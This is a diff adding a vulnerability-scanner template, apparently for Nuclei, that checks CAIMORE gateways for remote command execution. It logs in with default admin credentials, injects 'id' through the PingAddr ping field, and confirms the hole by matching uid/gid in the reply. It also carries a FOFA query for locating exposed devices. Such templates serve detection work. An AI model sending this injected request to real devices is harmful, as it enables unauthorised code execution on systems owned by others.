@@ -1,0 +1,33 @@
+id: caimao-gateway-rce
+info:
+  name: caimao-gateway-rce
+  author: sb
+  severity: critical
+  tags: rce
+  description: 
+  reference: 
+  metadata:
+    fofa-query: app="CAIMORE-Gateway"
+    
+http:
+  - raw:
+      - |
+        POST /goform/formping HTTP/1.1
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Accept-Encoding: gzip
+
+        PingAddr=127.0.0.1|id&PingPackNumb=1&PingMsg=
+      - |
+        GET /pingmessages HTTP/1.1
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Accept-Encoding: gzip
+        
+    req-condition: true    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl: 
+          - 'contains(body_1,"Start") && contains(body_1,"Tip") && contains(body_2,"uid") && contains(body_2,"gid")'
+
+
+
